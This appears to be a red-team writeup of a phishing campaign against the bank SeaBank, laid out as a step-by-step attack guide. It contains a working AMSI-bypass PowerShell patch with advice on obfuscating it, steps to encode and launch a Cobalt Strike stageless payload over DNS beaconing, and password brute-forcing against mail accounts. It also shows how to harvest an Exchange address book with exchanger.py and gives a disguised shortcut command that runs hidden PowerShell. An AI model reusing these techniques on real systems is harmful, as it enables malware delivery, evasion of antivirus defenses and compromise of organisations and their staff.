<h1 align="center">🎣 My Phishing Case - SeaBank 🎣</h1>

## I.Create Malware - Simple CobaltStrike-Agent Runner
1. Encode the Payload

The original payload will use the default Cobalt Strike payload in .ps1 format.
Use "Windows Stageless Payload" to reduce detection chances and utilize DNS beaconing to evade outbound TCP connection blocks on the target system.
Then, use "encode.ps1" with the generated payload to obtain a Base64-encoded output.
Copy this output and replace it in "decode.ps1", which will be responsible for decoding and executing the Cobalt Strike payload.
The format of decode.ps1 will be as follows:
<p align="center">
  <img src="https://github.com/user-attachments/assets/c6b7d3a5-190b-4bca-a9ba-f1a4bfb03e65">
</p>

2. Bypass Defender

Regarding the bypass method, since the entire execution process relies on PowerShell, using existing AMSI bypass repositories is sufficient.Recon and information gathering on the target’s antivirus (AV) software is crucial because some bypass techniques only work on specific AVs. Additionally, once a bypass technique is used, it may be blacklisted, so modifying the bypass script (e.g., using string concatenation or encryption) is necessary for each attack.In this campaign, Red Team customized the AmsiScanBuffer bypass method from Rasta-Mouse to evade AV detection. The original AMSI bypass code is as follows:
```
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll") #-----------Modify this------------------
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer") #-----------Modify this------------------
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) #-----------Modify this------------------
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) #-----------Modify this------------------
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
The above patch needs to have its string values and byte sequences obfuscated to avoid detection by signature-based security measures.
## II. Reconnaissance to Create a Target List
1. ruler-linux64
   
In every phishing campaign, from my perspective, if a hacker gains access to any internal email account of a user, the success rate of the campaign is almost absolute. Once they obtain an account, the preparation of the script will be based on the role, department, and position of the user whose account has been compromised. This allows the attacker to target a limited number of users related to the controlled account (avoiding a large scope to prevent triggering alerts).

So first, we will prioritize searching for valid internal accounts. We can use powerful search engines like Intelx or ruler-linux64, combined with common password formats such as "<Company_name>@123", "<Company_name>@1234", "<Company_name>@2024", etc., to perform brute-force attacks.

In this case, I found only one system account with an information notification function - excellent! The power of this account is extremely significant. However, there is a problem: such accounts usually do not have any directly related departments or users. Therefore, selecting a target and preparing the scenario must still be done on a sufficiently large scope.(Later, we were still detected by alerts, but by then, we had enough time to establish a tunnel and a new command-and-control channel.Nice try, but I still feel sorry for the SOC team😆)

2. exchanger.py

Creating a target list requires a valid account on the target's Mail Exchange server. This can be done using the "exchanger.py" tool from the Impacket toolkit:
```
python3 exchanger.py DomainName/Username:"Password"@mail.domain.com nspi list-tables
```
The extracted email list will include email addresses, departments, and job titles of all users. This list can be used to compile a target list.

A custom Python script can be created to filter users based on the "title" field. This allows for a more focused attack on a specific department, which reduces scope and increases success rates:

<p align="center">
  <img src="https://github.com/user-attachments/assets/016f7dff-c28e-4a6c-afc9-59c53b0b636a">
</p>

## III. Weaponization
To increase the success rate, the payload-containing attachment will be sent as a ZIP file. This prevents the file format from being immediately visible when the recipient reads the email.

Additionally, the PowerShell script responsible for executing the payload should be hidden from the user's interface by setting its "Hidden Item" attribute:
![image](https://github.com/user-attachments/assets/8e49219f-8bc8-4e00-9915-a582d99b15b9)
Additionally, create a LINK SHORTCUT file in the payload directory to trigger the payload, with the "target" configured as follows:
```
C:\Windows\System32\cmd.exe /c "set STR1=power&& cmd.exe /c %STR1%shell -WindowStyle hidden -exec bypass Import-Module .\Thong_tin_cve\Thong_tin_chi_tiet.ps1
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/f77cc8bb-af2d-42e3-803e-7e8cd288dbe1">
</p>

This shortcut file will call the PowerShell.exe process of the operating system and execute the hidden payload located in the "Thong_tin_cve" folder.

The goal is to trick the user into clicking the shortcut file. To increase the click-through rate, the shortcut icon should be changed to resemble a folder icon (this can be done via the "Change Icon" option).

The folder name, file name, email content, and attached document should be customized according to the selected attack scenario.

In this case, the Red Team is using a fake security advisory about a new Exchange CVE that could lead to personal data leaks. Therefore, all naming conventions (folder, files, email, and attached document) will align with this phishing scenario.

Here is the full-chain of payload:
<p align="center">
  <img src="https://github.com/user-attachments/assets/aa13078f-aac5-4800-9621-67001abd36be">
</p>

## IV. Drop the BOMBS
After completing the setup and weaponization, the final step is to send an email with the attached file to the predefined target list with the following content:

<p align="center">
  <img src="https://github.com/user-attachments/assets/f248c44d-d27f-457b-8f56-05059cdd6500">
</p>

=>And now, just sit back and wait for the targets to take the bait.
<p align="center">
  <img src="https://github.com/user-attachments/assets/c757c30b-c57c-4f4f-b875-5957b517de10">
</p>
<p align="center">
😈Mission accomplished!😈
</p>

## V. Analysis of Strengths and Weaknesses
1. Strengths

✅This technique is extremely easy to implement, has a high success rate, and works well on both EDR and Kaspersky AV.

✅High flexibility and reusability due to using PowerShell as the main platform.

2. Weaknesses

❌Since the technique relies on PowerShell as the main platform, it will not work on Domains or Forests that have a "Disable PowerShell" policy in place. (However, there are ways to bypass such policies—we will discuss this in a separate topic later.)

❌And, of course, the common weakness of all phishing-based malware drop techniques: Mail Gateway. If the Mail Gateway blocks one of the formats we use (even after compression), the malware delivery to the user will not happen. However, this issue can be mitigated by compressing the entire payload and setting a password before sending it. This approach makes preparation more challenging and reduces the success rate, but it helps evade Mail Gateway detection. (Therefore, leveraging new executable formats will open up more possibilities.)







